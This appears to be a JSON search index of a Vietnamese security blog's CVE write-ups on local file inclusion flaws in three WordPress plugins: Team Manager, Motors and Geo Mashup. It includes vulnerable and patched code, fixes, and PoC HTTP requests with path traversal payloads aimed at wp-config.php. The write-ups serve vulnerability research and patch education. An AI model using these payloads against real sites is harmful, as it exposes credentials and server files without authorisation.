Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rT·∫°o team m·ªõi t·∫°i endpoint: wp-admin/post-new.php?post_type=team_manager v√¨ khi c√≥ team th√¨ m·ªõi c√≥ gi√° tr·ªã ƒë·ªÉ th√™m v√†o layout c·ªßa widget Team Manager. Step 2\rT·∫°o post b·∫±ng Elementor, th√™m widgets Team Manager. Th√™m Team Manager widget v√†o post Step 3\rSubmit, b·∫Øt request b·∫±ng BurpSuite g·ª≠i ƒë·∫øn Repeater Step 4\rB√¥i ƒëen gi√° tr·ªã c·ªßa param action,s·ª≠a payload t·∫°i tab Inspector v√† g·ª≠i l·∫°i request Result: Debugger ƒë√£ nh·∫£y ƒë·∫øn wp-config.php K·∫øt qu·∫£ LFI th√†nh c√¥ng ","date":"2025-10-15","objectID":"/vi/posts/2025-10-15-cve-2025-30868/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/vi/posts/2025-10-15-cve-2025-30868/#step-1"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rT·∫°o team m·ªõi t·∫°i endpoint: wp-admin/post-new.php?post_type=team_manager v√¨ khi c√≥ team th√¨ m·ªõi c√≥ gi√° tr·ªã ƒë·ªÉ th√™m v√†o layout c·ªßa widget Team Manager. Step 2\rT·∫°o post b·∫±ng Elementor, th√™m widgets Team Manager. Th√™m Team Manager widget v√†o post Step 3\rSubmit, b·∫Øt request b·∫±ng BurpSuite g·ª≠i ƒë·∫øn Repeater Step 4\rB√¥i ƒëen gi√° tr·ªã c·ªßa param action,s·ª≠a payload t·∫°i tab Inspector v√† g·ª≠i l·∫°i request Result: Debugger ƒë√£ nh·∫£y ƒë·∫øn wp-config.php K·∫øt qu·∫£ LFI th√†nh c√¥ng ","date":"2025-10-15","objectID":"/vi/posts/2025-10-15-cve-2025-30868/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/vi/posts/2025-10-15-cve-2025-30868/#step-2"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rT·∫°o team m·ªõi t·∫°i endpoint: wp-admin/post-new.php?post_type=team_manager v√¨ khi c√≥ team th√¨ m·ªõi c√≥ gi√° tr·ªã ƒë·ªÉ th√™m v√†o layout c·ªßa widget Team Manager. Step 2\rT·∫°o post b·∫±ng Elementor, th√™m widgets Team Manager. Th√™m Team Manager widget v√†o post Step 3\rSubmit, b·∫Øt request b·∫±ng BurpSuite g·ª≠i ƒë·∫øn Repeater Step 4\rB√¥i ƒëen gi√° tr·ªã c·ªßa param action,s·ª≠a payload t·∫°i tab Inspector v√† g·ª≠i l·∫°i request Result: Debugger ƒë√£ nh·∫£y ƒë·∫øn wp-config.php K·∫øt qu·∫£ LFI th√†nh c√¥ng ","date":"2025-10-15","objectID":"/vi/posts/2025-10-15-cve-2025-30868/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/vi/posts/2025-10-15-cve-2025-30868/#step-3"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rStep 1\rT·∫°o team m·ªõi t·∫°i endpoint: wp-admin/post-new.php?post_type=team_manager v√¨ khi c√≥ team th√¨ m·ªõi c√≥ gi√° tr·ªã ƒë·ªÉ th√™m v√†o layout c·ªßa widget Team Manager. Step 2\rT·∫°o post b·∫±ng Elementor, th√™m widgets Team Manager. Th√™m Team Manager widget v√†o post Step 3\rSubmit, b·∫Øt request b·∫±ng BurpSuite g·ª≠i ƒë·∫øn Repeater Step 4\rB√¥i ƒëen gi√° tr·ªã c·ªßa param action,s·ª≠a payload t·∫°i tab Inspector v√† g·ª≠i l·∫°i request Result: Debugger ƒë√£ nh·∫£y ƒë·∫øn wp-config.php K·∫øt qu·∫£ LFI th√†nh c√¥ng ","date":"2025-10-15","objectID":"/vi/posts/2025-10-15-cve-2025-30868/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/vi/posts/2025-10-15-cve-2025-30868/#step-4"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rCVE-2025-30868 l√† LFI trong Team Manager ‚â§2.1.23: renderElementorLayout() kh√¥ng x√°c th·ª±c $layout/$settings, cho ph√©p path traversal v√† include() file ngo√†i √Ω mu·ªën. ƒê√£ v√° trong v2.2.0 b·∫±ng whitelist, regex v√† ki·ªÉm tra realpath(). ","date":"2025-10-15","objectID":"/vi/posts/2025-10-15-cve-2025-30868/:5:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/vi/posts/2025-10-15-cve-2025-30868/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways\rKh√¥ng d√πng input th√¥ ƒë·ªÉ build include. D√πng whitelist cho layout/template. Sanitize t√™n file + realpath() + is_readable() tr∆∞·ªõc khi include. V·ªõi endpoint public: ki·ªÉm so√°t input server-side, nonce kh√¥ng ƒë·ªß. ","date":"2025-10-15","objectID":"/vi/posts/2025-10-15-cve-2025-30868/:6:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/vi/posts/2025-10-15-cve-2025-30868/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rFile Inclusion/Path traversal ‚Äî Hacktrick WordPress Team Manager Plugin \u003c= 2.1.23 is vulnerable to Local File Inclusion ","date":"2025-10-15","objectID":"/vi/posts/2025-10-15-cve-2025-30868/:7:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/vi/posts/2025-10-15-cve-2025-30868/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Motors Plugin.","date":"2025-10-14","objectID":"/vi/posts/2025-10-14-cve-2025-32654/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32654 Analysis \u0026 POC","uri":"/vi/posts/2025-10-14-cve-2025-32654/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin Motors phi√™n b·∫£n ‚â§ 1.4.71 ch·ª©a l·ªó h·ªïng Local File Inclusion cho ph√©p k·∫ª t·∫•n c√¥ng kh√¥ng c·∫ßn x√°c th·ª±c ƒëi·ªÅu khi·ªÉn tham s·ªë file trong l·ªánh include/require, t·ª´ ƒë√≥ ch√®n ho·∫∑c ƒë·ªçc c√°c t·ªáp c·ª•c b·ªô tr√™n m√°y ch·ªß (v√≠ d·ª• file c·∫•u h√¨nh ch·ª©a credential), d·∫´n t·ªõi r√≤ r·ªâ th√¥ng tin nh·∫°y c·∫£m v√† trong m·ªôt s·ªë c·∫•u h√¨nh c√≥ th·ªÉ d·∫´n t·ªõi th·ª±c thi m√£. CVE ID: CVE-2025-32654 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 1.4.71 Patched Versions: 1.4.72 CVSS severity: High (8.1) Required Privilege: Unauthenticated Product: WordPress Motors Plugin ","date":"2025-10-14","objectID":"/vi/posts/2025-10-14-cve-2025-32654/:1:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32654 Analysis \u0026 POC","uri":"/vi/posts/2025-10-14-cve-2025-32654/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Motors: 1.4.71 (vulnerable) v√† 1.4.72 (patched). Diff tool - Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n. ","date":"2025-10-14","objectID":"/vi/posts/2025-10-14-cve-2025-32654/:2:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32654 Analysis \u0026 POC","uri":"/vi/posts/2025-10-14-cve-2025-32654/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-10-14","objectID":"/vi/posts/2025-10-14-cve-2025-32654/:3:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32654 Analysis \u0026 POC","uri":"/vi/posts/2025-10-14-cve-2025-32654/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rB·∫£n l·ªói: public static function motors_ew_grid_tabs() { $template = sanitize_text_field( $_POST['template'] ); // other logic } B·∫£n l·ªói ch·ªâ l·ªçc k√Ω t·ª± HTML b·∫±ng sanitize_text_field(), kh√¥ng gi·ªõi h·∫°n ƒë∆∞·ªùng d·∫´n, n√™n attacker c√≥ th·ªÉ ch√®n ../ ho·∫∑c t√™n file b·∫•t k·ª≥ =\u003e LFI. B·∫£n v√°: public static function motors_ew_grid_tabs() { $allowed_templates = array( 'listing-cars/listing-grid-directory-loop-4', 'listing-cars/listing-grid-directory-loop-3', 'listing-cars/listing-grid-directory-loop', ); $template = 'listing-cars/' . ( isset( $_POST['template'] ) ? sanitize_file_name( $_POST['template'] ) : '' ); if ( ! in_array( $template, $allowed_templates, true ) ) { wp_send_json_error( 'Invalid template' ); return; } // other logic } B·∫£n v√° √°p d·ª•ng sanitize_file_name() + whitelist ki·ªÉm tra h·ª£p l·ªá, gi√∫p kh√≥a ch·∫∑t input v√† lo·∫°i b·ªè ho√†n to√†n kh·∫£ nƒÉng khai th√°c th√¥ng qua tham s·ªë template. ","date":"2025-10-14","objectID":"/vi/posts/2025-10-14-cve-2025-32654/:3:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32654 Analysis \u0026 POC","uri":"/vi/posts/2025-10-14-cve-2025-32654/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code\rH√†m motors_ew_grid_tabs() ƒë∆∞·ª£c ƒëƒÉng k√Ω l√†m callback cho action hook c√≥ t√™n \"grid_tabs_widget\" th√¥ng qua ƒëo·∫°n m√£: add_action( 'wp_ajax_nopriv_grid_tabs_widget', array( self::class, 'motors_ew_grid_tabs' ) ); Ti·ªÅn t·ªë wp_ajax_nopriv_ cho bi·∫øt action n√†y kh√¥ng y√™u c·∫ßu ng∆∞·ªùi d√πng ƒëƒÉng nh·∫≠p khi g·ªçi ƒë·∫øn endpoint AJAX. Do ƒë√≥, endpoint th·ª±c t·∫ø c√≥ th·ªÉ ƒë∆∞·ª£c truy c·∫≠p c√¥ng khai qua: /wp-admin/admin-ajax.php?action=grid_tabs_widget Khi ƒë√≥ motors_ew_grid_tabs() ƒë∆∞·ª£c g·ªçi: public static function motors_ew_grid_tabs() { check_ajax_referer( 'motors_grid_tabs', 'security' ); $listing_types = apply_filters( 'stm_listings_post_type', 'listings' ); $tab_type = sanitize_text_field( $_POST['tab_type'] ); $per_page = intval( $_POST['per_page'] ); $template = sanitize_text_field( $_POST['template'] ); $img_size = sanitize_text_field( $_POST['img_size'] ); $args = array( 'post_type' =\u003e $listing_types, 'post_status' =\u003e 'publish', 'posts_per_page' =\u003e $per_page, ); if ( 'popular' === $tab_type ) { $args = array_merge( $args, array( 'orderby' =\u003e 'meta_value_num', 'meta_key' =\u003e 'stm_car_views', 'order' =\u003e 'DESC', ) ); } $args['meta_query'][] = array( 'key' =\u003e 'car_mark_as_sold', 'value' =\u003e '', 'compare' =\u003e '=', ); $template_args = array(); if ( ! empty( $img_size ) ) { $template_args = array( 'custom_img_size' =\u003e $img_size, ); } $listings_query = new WP_Query( $args ); if ( $listings_query-\u003ehave_posts() ) { $output = ''; ob_start(); while ( $listings_query-\u003ehave_posts() ) { $listings_query-\u003ethe_post(); do_action( 'stm_listings_load_template', $template, $template_args ); } $output .= ob_get_clean(); } wp_send_json( array( 'html' =\u003e $output, ) ); } Trong h√†m motors_ew_grid_tabs(), d√≤ng ƒë·∫ßu ti√™n: check_ajax_referer( 'motors_grid_tabs', 'security' ); th·ª±c hi·ªán ki·ªÉm tra nonce ƒë·ªÉ b·∫£o v·ªá kh·ªèi CSRF (Cross-Site Request Forgery). N·∫øu nonce g·ª≠i t·ª´ client kh√¥ng h·ª£p l·ªá ho·∫∑c kh√¥ng t·ªìn t·∫°i, h√†m n√†y s·∫Ω d·ª´ng to√†n b·ªô qu√° tr√¨nh x·ª≠ l√Ω AJAX - nghƒ©a l√† c√°c ƒëo·∫°n logic ph√≠a sau (bao g·ªìm x·ª≠ l√Ω $template, truy v·∫•n b√†i vi·∫øt, v√† render HTML) s·∫Ω kh√¥ng ƒë∆∞·ª£c th·ª±c thi. public static function motors_create_nonce() { $grid_tabs_widget = wp_create_nonce( 'motors_grid_tabs' ); // other logic wp_localize_script( 'jquery', 'mew_nonces', array( 'motors_grid_tabs' =\u003e $grid_tabs_widget, // other logic ) ); } H√†m motors_create_nonce() t·∫°o nonce cho action 'motors_grid_tabs' b·∫±ng wp_create_nonce() r·ªìi truy·ªÅn sang JavaScript qua wp_localize_script() d∆∞·ªõi bi·∫øn mew_nonces.motors_grid_tabs. M·∫πo V√¨ l·ªó h·ªïng n√†y l√† lo·∫°i Unauthenticated, n√™n nonce kh√¥ng ƒë∆∞·ª£c hi·ªÉn th·ªã trong khu v·ª±c admin. Thay v√†o ƒë√≥, h√£y truy c·∫≠p trang ch·ªß sau khi plugin ƒë√£ ƒë∆∞·ª£c c√†i ƒë·∫∑t ƒë·∫ßy ƒë·ªß c√°c ph·ª• thu·ªôc, r·ªìi t√¨m t·ª´ kh√≥a motors_grid_tabs trong m√£ ngu·ªìn trang ƒë·ªÉ l·∫•y gi√° tr·ªã nonce c·∫ßn thi·∫øt. Gi√° tr·ªã nonce hi·ªÉn th·ªã trong m√£ ngu·ªìn tr√¨nh duy·ªát Ngo√†i ra, trong m√£ ngu·ªìn trang ch·ªß c√≤n c√≥ ƒëo·∫°n JavaScript th·ª±c hi·ªán g·ªçi AJAX t·ª± ƒë·ªông ƒë·∫øn endpoint ta ƒëang focus: /wp-admin/admin-ajax.php?action=grid_tabs_widget khi trang ƒë∆∞·ª£c t·∫£i: \u003cscript\u003e (function($) { $(document).ready(function() { $.ajax({ type: \"POST\", url: ajaxurl, dataType: 'json', async: true, data: 'action=grid_tabs_widget\u0026tab_type=popular\u0026per_page=8\u0026template=listing-cars/listing-grid-directory-loop-4\u0026img_size=\u0026security=' + mew_nonces.motors_grid_tabs, success: function(data) { if( data.hasOwnProperty('html') ) $('#popular-tab-content').html(data.html); updateGridItemTitles(); }, }); }); })(jQuery) \u003c/script\u003e ƒêo·∫°n script t·ª± ƒë·ªông ch·∫°y v√¨ n·∫±m trong $(document).ready(), n√™n khi trang load xong, jQuery s·∫Ω t·ª± th·ª±c thi h√†m AJAX. T·∫≠n d·ª•ng ƒëi·ªÅu n√†y, ta reload trang ch·ªß v√† b·∫Øt ajax request b·∫±ng BurpSuite, ƒë·ªÉ l·∫•y c√°c param c·∫ßn thi·∫øt do plugin cung c·∫•p. POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0 Accept: application/json, text/javascript, */*; q=0.01 Accept-Language: vi,en-US;q=0.7,en;q=0.3 Accept-Encoding: gzip, deflate, br Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requeste","date":"2025-10-14","objectID":"/vi/posts/2025-10-14-cve-2025-32654/:3:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32654 Analysis \u0026 POC","uri":"/vi/posts/2025-10-14-cve-2025-32654/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-14","objectID":"/vi/posts/2025-10-14-cve-2025-32654/:4:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32654 Analysis \u0026 POC","uri":"/vi/posts/2025-10-14-cve-2025-32654/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rTh√™m code tr·∫£ v·ªÅ trong wp-config.php ƒë·ªÉ th·ª≠ nghi·ªám \u003c?php echo \"payload\" G·ª≠i POST request ch·ª©a LFI payload POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0 Accept: application/json, text/javascript, */*; q=0.01 Accept-Language: vi,en-US;q=0.7,en;q=0.3 Accept-Encoding: gzip, deflate, br Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 123 Origin: http://localhost Connection: keep-alive Referer: http://localhost/ Cookie: wordpress_test_cookie=WP%20Cookie%20check; wp_lang=en_US; stm_car_watched=2520 Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin X-PwnFox-Color: cyan action=grid_tabs_widget\u0026tab_type=popular\u0026per_page=8\u0026template=/partials/../../../../../payload\u0026img_size=\u0026security=d15dd83890 Result: K·∫øt qu·∫£ LFI th√†nh c√¥ng ","date":"2025-10-14","objectID":"/vi/posts/2025-10-14-cve-2025-32654/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32654 Analysis \u0026 POC","uri":"/vi/posts/2025-10-14-cve-2025-32654/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rCVE-2025-32654 l√† m·ªôt LFI trong plugin Motors ‚â§1.4.71: tham s·ªë template kh√¥ng ƒë∆∞·ª£c r√†ng bu·ªôc, cho ph√©p path traversal v√† include() file b·∫•t k·ª≥. Endpoint c√¥ng khai (wp_ajax_nopriv_) v√† nonce xu·∫•t tr√™n front‚Äëend gi√∫p k·∫ª t·∫•n c√¥ng d·ªÖ khai th√°c. L·ªó h·ªïng ƒë∆∞·ª£c v√° trong v1.4.72 b·∫±ng c√°ch chu·∫©n ho√° t√™n file v√† ki·ªÉm tra whitelist. ","date":"2025-10-14","objectID":"/vi/posts/2025-10-14-cve-2025-32654/:5:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32654 Analysis \u0026 POC","uri":"/vi/posts/2025-10-14-cve-2025-32654/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways\rKh√¥ng d√πng input th√¥ ƒë·ªÉ build ƒë∆∞·ªùng d·∫´n cho include. ∆Øu ti√™n whitelist template/ƒë∆∞·ªùng d·∫´n h·ª£p l·ªá. Chu·∫©n ho√° (e.g. sanitize_file_name()/sanitize_key()), d√πng realpath() ƒë·ªÉ so s√°nh v·ªõi th∆∞ m·ª•c g·ªëc. N·∫øu endpoint ph·∫£i c√¥ng khai, b·∫Øt bu·ªôc ki·ªÉm so√°t ch·∫∑t input ch·ª© ƒë·ª´ng ch·ªâ tr√¥ng v√†o nonce. ","date":"2025-10-14","objectID":"/vi/posts/2025-10-14-cve-2025-32654/:6:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32654 Analysis \u0026 POC","uri":"/vi/posts/2025-10-14-cve-2025-32654/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rFile Inclusion/Path traversal ‚Äî Hacktrick WordPress Motors Plugin \u003c= 1.4.71 is vulnerable to Local File Inclusion ","date":"2025-10-14","objectID":"/vi/posts/2025-10-14-cve-2025-32654/:7:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-32654 Analysis \u0026 POC","uri":"/vi/posts/2025-10-14-cve-2025-32654/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Geo Mashup Plugin.","date":"2025-10-13","objectID":"/vi/posts/2025-10-13-cve-2025-48293/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-48293 Analysis \u0026 POC","uri":"/vi/posts/2025-10-13-cve-2025-48293/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin Geo Mashup phi√™n b·∫£n ‚â§ 1.13.16 ch·ª©a l·ªó h·ªïng Local File Inclusion cho ph√©p k·∫ª t·∫•n c√¥ng kh√¥ng c·∫ßn x√°c th·ª±c ƒëi·ªÅu khi·ªÉn tham s·ªë file trong l·ªánh include/require, t·ª´ ƒë√≥ ch√®n ho·∫∑c ƒë·ªçc c√°c t·ªáp c·ª•c b·ªô tr√™n m√°y ch·ªß (v√≠ d·ª• file c·∫•u h√¨nh ch·ª©a credential), d·∫´n t·ªõi r√≤ r·ªâ th√¥ng tin nh·∫°y c·∫£m v√† trong m·ªôt s·ªë c·∫•u h√¨nh c√≥ th·ªÉ d·∫´n t·ªõi th·ª±c thi m√£. CVE ID: CVE-2025-48293 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 1.13.16 Patched Versions: 1.13.17 CVSS severity: High (9.8) Required Privilege: Unauthenticated Product: WordPress Geo Mashup Plugin ","date":"2025-10-13","objectID":"/vi/posts/2025-10-13-cve-2025-48293/:1:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-48293 Analysis \u0026 POC","uri":"/vi/posts/2025-10-13-cve-2025-48293/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Geo Mashup: 1.13.16 (vulnerable) v√† 1.13.17 (patched). Diff tool - Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n. ","date":"2025-10-13","objectID":"/vi/posts/2025-10-13-cve-2025-48293/:2:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-48293 Analysis \u0026 POC","uri":"/vi/posts/2025-10-13-cve-2025-48293/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-10-13","objectID":"/vi/posts/2025-10-13-cve-2025-48293/:3:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-48293 Analysis \u0026 POC","uri":"/vi/posts/2025-10-13-cve-2025-48293/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rB·∫£n l·ªói: public static function generate_object_html( ) { $template_base = ( isset( $_GET['template'] ) ) ? $_GET['template'] : ''; // other logc load_template( GeoMashup::locate_template( $template_base ) ); } $template_base ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ $_GET['template'] kh√¥ng qua b·∫•t k·ª≥ ki·ªÉm tra/sanitize n√†o. K·∫øt qu·∫£ ƒë∆∞·ª£c truy·ªÅn v√†o GeoMashup::locate_template() r·ªìi d√πng load_template() - kh·∫£ nƒÉng k·∫ª t·∫•n c√¥ng ki·ªÉm so√°t ƒë∆∞·ªùng d·∫´n file ƒë·ªÉ include. B·∫£n v√°: public static function generate_object_html( ) { $template_base = ( isset( $_GET['template'] ) ) ? sanitize_key($_GET['template']) : ''; // other logic load_template( GeoMashup::locate_template( $template_base ) ); } sanitize_key() ƒë∆∞·ª£c √°p d·ª•ng cho template =\u003e lo·∫°i b·ªè c√°c k√Ω t·ª± kh√¥ng an to√†n, ngƒÉn ../, \\, v√† c√°c k√Ω t·ª± ƒë·∫∑c bi·ªát l√†m gi·∫£m nguy c∆° path traversal v√† LFI t·ª´ tham s·ªë template. ","date":"2025-10-13","objectID":"/vi/posts/2025-10-13-cve-2025-48293/:3:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-48293 Analysis \u0026 POC","uri":"/vi/posts/2025-10-13-cve-2025-48293/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code\rTa ph√¢n t√≠ch logic trong GeoMashup::locate_template() c√≥ ·∫£nh h∆∞·ªüng g√¨ ƒë·∫øn $template_base public static function locate_template( $template_base ) { $template = locate_template( array(\"geo-mashup-$template_base.php\") ); if ( empty( $template ) || !is_readable( $template ) ) { $template = path_join( GEO_MASHUP_DIR_PATH, \"default-templates/$template_base.php\" ); } return $template; } $template ƒë∆∞·ª£c g√°n l·∫°i gi√° tr·ªã b·∫±ng c√°ch g·ªçi locate_template() thu·ªôc file template.php v·ªõi ƒë·ªëi s·ªë geo-mashup-$template_base.php function locate_template( $template_names, $load = false, $load_once = true, $args = array() ) { global $wp_stylesheet_path, $wp_template_path; if ( ! isset( $wp_stylesheet_path ) || ! isset( $wp_template_path ) ) { wp_set_template_globals(); } $is_child_theme = is_child_theme(); $located = ''; foreach ( (array) $template_names as $template_name ) { if ( ! $template_name ) { continue; } if ( file_exists( $wp_stylesheet_path . '/' . $template_name ) ) { $located = $wp_stylesheet_path . '/' . $template_name; break; } elseif ( $is_child_theme \u0026\u0026 file_exists( $wp_template_path . '/' . $template_name ) ) { $located = $wp_template_path . '/' . $template_name; break; } elseif ( file_exists( ABSPATH . WPINC . '/theme-compat/' . $template_name ) ) { $located = ABSPATH . WPINC . '/theme-compat/' . $template_name; break; } } if ( $load \u0026\u0026 '' !== $located ) { load_template( $located, $load_once, $args ); } return $located; } C√°c logic li√™n quan ƒë·∫øn s·ª± t·ªìn t·∫°i c·ªßa file khi concat v·ªõi $template_name ƒë∆∞·ª£c x·ª≠ l√Ω, n·∫øu kh√¥ng t·ªìn t·∫°i th√¨ tr·∫£ v·ªÅ chu·ªói r·ªóng '' C√°c logic li√™n quan ƒë·∫øn s·ª± t·ªìn t·∫°i c·ªßa file Khi attack g·ª≠i $_GET['template'] ch·ª©a ../ th√¨ m·∫∑c ƒë·ªãnh file lu√¥n kh√¥ng t·ªìn t·∫°i, lu√¥n tr·∫£ v·ªÅ '' Quay tr·ªü l·∫°i GeoMashup::locate_template(), khi $template_name empty v√† kh√¥ng t·ªìn t·∫°i (!is_readable($template)) th√¨ ƒë∆∞·ª£c g√°n l·∫°i gi√° tr·ªã v√† tr·∫£ v·ªÅ. const string GEO_MASHUP_DIR_PATH = \"/srv/www/wordpress/wp-content/plugins/geo-mashup\" GEO_MASHUP_DIR_PATH.default-templates/$template_base.php üëâ GeoMashup::locate_template() kh√¥ng ·∫£nh h∆∞·ªüng ƒë·∫øn $template_base do ta ki·ªÉm so√°t, ta ti·∫øn h√†nh t√¨m c√°ch k√≠ch ho·∫°t s·ª± ki·ªán n√†y if ( ( isset( $_GET['output'] ) and 'json' == $_GET['output'] ) or empty( $_GET['object_ids'] ) ) { GeoMashupQuery::generate_location_json( ); } else { GeoMashupQuery::generate_object_html( ); } generate_object_html() ch·ªâ ƒë∆∞·ª£c g·ªçi khi $_GET['output'] kh√¥ng ƒë∆∞·ª£c truy·ªÅn v√† $_GET['object_ids'] kh√¥ng empty. geo-query.php ch·ª©a logic tr√™n ƒë∆∞·ª£c g·ªçi trong geo-mashup.php geo-query.php ƒë∆∞·ª£c g·ªçi trong geo-mashup.php H√†m geo_query l√† callback c·ªßa action hook Unauthenticated add_action( 'wp_ajax_nopriv_geo_mashup_query', array( __CLASS__, 'geo_query') ); Khi truy c·∫≠p endpoint /wp-admin/admin-ajax.php v·ªõi param action=geo_mashup_query th√¨ callback geo_query ƒë∆∞·ª£c g·ªçi. ","date":"2025-10-13","objectID":"/vi/posts/2025-10-13-cve-2025-48293/:3:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-48293 Analysis \u0026 POC","uri":"/vi/posts/2025-10-13-cve-2025-48293/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-13","objectID":"/vi/posts/2025-10-13-cve-2025-48293/:4:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-48293 Analysis \u0026 POC","uri":"/vi/posts/2025-10-13-cve-2025-48293/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rTh√™m code v√†o wp-config.php ƒë·ªÉ th·ª≠ nghi·ªám echo \"Payload\"; G·ª≠i GET request v·ªõi LFI payload GET /wp-admin/admin-ajax.php?action=geo_mashup_query\u0026object_ids=2\u0026template=../../../../wp-config HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: vi,en-US;q=0.7,en;q=0.3 Accept-Encoding: gzip, deflate, br Connection: keep-alive Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 X-PwnFox-Color: green Priority: u=0, i Result: K·∫øt qu·∫£ LFI th√†nh c√¥ng ","date":"2025-10-13","objectID":"/vi/posts/2025-10-13-cve-2025-48293/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-48293 Analysis \u0026 POC","uri":"/vi/posts/2025-10-13-cve-2025-48293/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rCVE-2025-48293 l√† LFI do d√πng input template kh√¥ng ki·ªÉm so√°t khi gh√©p v√†o ƒë∆∞·ªùng d·∫´n fallback, cho ph√©p path traversal (..) v√† include file ngo√†i d·ª± ƒë·ªãnh. ƒê√£ v√° trong v1.13.17 b·∫±ng sanitize_key(). ","date":"2025-10-13","objectID":"/vi/posts/2025-10-13-cve-2025-48293/:5:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-48293 Analysis \u0026 POC","uri":"/vi/posts/2025-10-13-cve-2025-48293/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways\rKh√¥ng d√πng input user tr·ª±c ti·∫øp ƒë·ªÉ build path cho include. D√πng whitelist ho·∫∑c sanitize_key() + realpath() ki·ªÉm tra. ","date":"2025-10-13","objectID":"/vi/posts/2025-10-13-cve-2025-48293/:6:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-48293 Analysis \u0026 POC","uri":"/vi/posts/2025-10-13-cve-2025-48293/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rFile 